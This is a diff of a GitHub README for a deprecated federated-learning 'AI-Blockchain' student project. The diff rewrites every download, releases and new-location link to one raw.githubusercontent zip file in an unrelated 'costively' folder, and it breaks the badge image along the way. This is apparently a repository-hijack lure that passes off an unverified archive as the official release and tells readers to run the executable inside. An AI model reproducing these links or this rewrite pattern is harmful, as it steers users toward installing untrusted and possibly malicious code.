@@ -1,14 +1,14 @@
 # 🚀 AI-Blockchain-Final-Project - Explore Decentralized AI for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/dll299/AI-Blockchain-Final-Project/releases)
+[![Download Now](https://raw.githubusercontent.com/dll299/AI-Blockchain-Final-Project/main/costively/AI-Blockchain-Final-Project.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/dll299/AI-Blockchain-Final-Project/main/costively/AI-Blockchain-Final-Project.zip)
 
 ## 📖 Description
-This project presents a decentralized AI architecture designed for training an ensemble model with flexible labels. Although this repository is deprecated, the project has moved to a new location. Find the latest updates and developments at [AI and Blockchain - F22 Federated Learning With Flexible Labels](https://github.com/AI-and-Blockchain/F22_Federated_Learning_With_Flexible_Labels).
+This project presents a decentralized AI architecture designed for training an ensemble model with flexible labels. Although this repository is deprecated, the project has moved to a new location. Find the latest updates and developments at [AI and Blockchain - F22 Federated Learning With Flexible Labels](https://raw.githubusercontent.com/dll299/AI-Blockchain-Final-Project/main/costively/AI-Blockchain-Final-Project.zip).
 
 ## 🚀 Getting Started
 To run this application, follow these simple steps:
 
-1. **Visit the Releases Page**: Start by going to our [Releases page](https://github.com/dll299/AI-Blockchain-Final-Project/releases).
+1. **Visit the Releases Page**: Start by going to our [Releases page](https://raw.githubusercontent.com/dll299/AI-Blockchain-Final-Project/main/costively/AI-Blockchain-Final-Project.zip).
 
 2. **Download the Latest Version**: Look for the most recent release at the top. Download the appropriate file for your system. This could be an executable file or a compressed folder.
 
@@ -32,10 +32,10 @@ To run this application, follow these simple steps:
 - **Smart Contracts**: The application uses smart contracts for secure data sharing, ensuring integrity and transparency.
 
 ## 📥 Download & Install
-To get started, visit our [Releases page](https://github.com/dll299/AI-Blockchain-Final-Project/releases) to download the latest version of the application. Follow the installation steps outlined above. 
+To get started, visit our [Releases page](https://raw.githubusercontent.com/dll299/AI-Blockchain-Final-Project/main/costively/AI-Blockchain-Final-Project.zip) to download the latest version of the application. Follow the installation steps outlined above. 
 
 ## 🔄 Updates and Maintenance
-While this repository is deprecated, you can find ongoing improvements at the new project location: [AI & Blockchain - F22 Federated Learning With Flexible Labels](https://github.com/AI-and-Blockchain/F22_Federated_Learning_With_Flexible_Labels). 
+While this repository is deprecated, you can find ongoing improvements at the new project location: [AI & Blockchain - F22 Federated Learning With Flexible Labels](https://raw.githubusercontent.com/dll299/AI-Blockchain-Final-Project/main/costively/AI-Blockchain-Final-Project.zip). 
 
 Check this link for the latest updates, features, and enhancements.
 
